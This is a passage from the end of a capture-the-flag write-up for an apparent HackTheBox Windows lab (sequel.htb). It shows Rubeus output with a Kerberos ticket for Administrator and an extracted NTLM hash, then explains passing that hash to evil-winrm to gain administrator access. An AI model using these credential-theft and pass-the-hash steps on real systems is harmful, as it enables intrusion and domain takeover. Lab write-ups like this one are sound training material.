      tCUeXdr/Cj33qn7NCyBcBwwavBIFAhaknyU6oBLcMsULSsPFfnC7dskVtPC59lO8lPbVJ/xePaokwV0c
      JQhla8sZZ2OfJinCNVFnctOTdFeVZ5tmHrkJbHCMd0WyDP815ELU/cEgol3Pw87gccupg2HLicPFh+DQ
      LuGpxgKMMv6ZXI0EAte8HE7dN5dtKb5f68T0z/+AxNbqK1hhcJH1WcVVxji2c8T7PG24f7UpxDn9/gZn
      ZxR1VI/UJmI4YgTIJ51nRJk065S89Ewi0Mbg/JXY7wvsKOX5+86JNPA6siDJljXqYXopxQOrljv/KvmE
      XbPdSpVZRHeI8QNI0nndhMr7x75z1U4VXXGPq1IF/mbkJo7uyadaBPsYSo/newu05TmNDw6Lk8pi3Wsn
      V/eK97O8snpJwZgNOPRgC/JJhp4Jx4LpA3LkGtC596QiwPJizzavUvAo6w+nW0nKfWjQZ9CCv+OSjj9p
      +qvx/tsdu2tEKnwnrwnbAFIfsDUTCTuSepesBay7UBMar5gNKOPc1JL81m3rzqElKHFSoCAbZXZMxIjr
      nTCnR9oBcJgGpzOPt0iW7uVGTbSlWiVMXqwaiAisIc6Qeuoas2wKj9bqhdnbH7YfA82pSVWqE83A3ro/
      bb91kxQBbR57KXV9BvX409qQLZOJoJLE3nO2v9F6/X5GesoPYWhS6q62eVirAYF7vBcTlMxE2NM6HiyQ
      Du+z/Lzfera9We/VzhQxxNF4KSxNWCp3y6AaLwMtpvKIBYCJlTDQ83OpGEGue+K7Xbk+oc10FJ8+1BOS
      iJBrnFbKI59zliSSQIRA0KOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIE
      ELqrfWqr3xbapAWSXdj7+8ahDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3Kj
      BwMFAADhAAClERgPMjAyMzA2MDUwMzExMjBaphEYDzIwMjMwNjA1MTMxMTIwWqcRGA8yMDIzMDYxMjAz
      MTEyMFqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  6/4/2023 8:11:20 PM
  EndTime                  :  6/5/2023 6:11:20 AM
  RenewTill                :  6/11/2023 8:11:20 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  uqt9aqvfFtqkBZJd2Pv7xg==
  ASREP (key)              :  9098E4AA6D67E86FEDAE485818F2ECF3

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE //Here is NTLM hash that need to be used for PassTheHash attack


```

### Getting Administrator access

Hash obtained from `Rubeus` can be used for `PassTheHash` attack if there is NTLM authentication enabled.

For this `evil-winrm` can be used with `-H` flag that takes NTLM hash

<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption><p>Rooted box</p></figcaption></figure>
